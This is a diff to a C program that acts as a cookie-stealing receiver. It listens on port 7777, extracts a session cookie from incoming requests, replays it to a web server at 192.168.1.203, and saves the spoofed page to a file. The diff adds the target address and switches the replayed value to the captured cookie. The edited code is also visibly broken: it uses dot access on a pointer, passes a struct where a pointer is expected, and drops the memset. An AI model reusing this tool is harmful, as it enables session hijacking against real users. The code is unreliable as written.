@@ -19,6 +19,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#define WEB_IP "192.168.1.203"
+#define WEB_PORT 80
 #define PORT 7777
 #define BUFFER_SIZE 8192
 #define OUTPUT_FILE "spoofed-dom.txt"
@@ -95,11 +97,8 @@ static int extract_cookie(const char *request,
 /*
  * SERVER BIND AND LISTEN
  */
-static int bind_and_listen(int server_fd)
+static int bind_and_listen(int server_fd, struct sockaddr_in *server_addr)
 {
-  struct sockaddr_in server_addr;
-
-  memset(&server_addr, 0, sizeof(server_addr));
   server_addr.sin_family = AF_INET;
   server_addr.sin_addr.s_addr = INADDR_ANY;
   server_addr.sin_port = htons(PORT);
@@ -203,7 +202,8 @@ int main(void) {
       exit(EXIT_FAILURE);
     }
     // BIND AND LISTEN
-    int bind_n_listen = bind_and_listen(server_fd);
+    struct sockaddr_in addr;
+    int bind_n_listen = bind_and_listen(server_fd, addr);
     if (bind_n_listen!=1){
       close(server_fd);
       exit(EXIT_FAILURE);
@@ -214,8 +214,7 @@ int main(void) {
 
     // ACCEPT CLIENT
     int client_fd = -1;
-    struct sockaddr_in client_addr;
-    client_fd = accept_client(server_fd, &client_addr);
+    client_fd = accept_client(server_fd, &addr);
     if (client_fd < 0){
       close(server_fd);
       exit(EXIT_FAILURE);
@@ -244,7 +243,7 @@ int main(void) {
   }
 
   // SEND REQUEST TO WEB AND SAVE RESPONSE TO OUT FILE
-  if (send_request_to_web(sessid)!=1){
+  if (send_request_to_web(cookie)!=1){
 
     close(client_fd);
     close(server_fd);
